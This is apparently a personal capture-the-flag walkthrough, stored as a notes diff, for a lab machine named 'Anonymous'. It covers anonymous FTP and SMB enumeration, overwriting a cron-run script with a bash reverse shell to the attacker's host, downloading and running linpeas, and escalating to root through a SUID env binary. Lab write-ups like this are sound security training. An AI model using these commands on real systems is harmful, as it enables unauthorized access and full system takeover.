@@ -1,0 +1,39 @@
+Anonymous
+.- *nmap -T4 -A 10.201.77.68*
+	- port 21 - ftp
+	- port 22 - ssh
+	- port 139 - samba smbd
+	- port 445 - samba smbd
+- *ftp anonymous@10.201.77.68*
+	- *ls*
+	- *cd scripts*
+	- got some files, but appears to be a dead end
+- *smbclient -L //10.201.77.68 -N*
+	- reveals "pics" share
+- *smbclient //10.201.77.68/pics -N*
+	- -N for anonymous connection
+	- grab 2 images from the share
+- *ftp anonymous@10.201.77.68*
+	- ftp> *cd scripts*
+	- ftp> *ls*
+		- **-rwxr-xrwx**    1 1000     1000          358 Sep 06 21:28 clean.sh
+		- the permissions on the clean.sh script, specifically execute, implies a cron job scheduled to run it.
+- *nc -nvlp 4444*
+- we edit the clean.sh file to include:
+	- *bash -i >& /dev/tcp/10.23.172.46/4444 0>&1*
+- we *put* the new clean.sh file with FTP, and wait for the cron job to run
+	- gives us a shell as "namelessone" low-level user
+	- *cat scripts/user.txt*
+- *python -m http.server 8081*
+- *wget http://10.23.172.46:8081/linpeas.sh*
+- *chmod +x linpeas.sh*
+- *./linpeas.sh*![[Pasted image 20250907143122.png]]
+	- [[Escalation Path - SUID]]
+- *find / -perm -u=s -type f 2>/dev/null*
+	- looking for env like reported above
+- GTFObins: env - SUID
+	- https://gtfobins.github.io/gtfobins/env/
+	- */usr/bin/env /bin/sh -p*
+- *whoami*
+	- root
+	- *cat /root/root.txt*
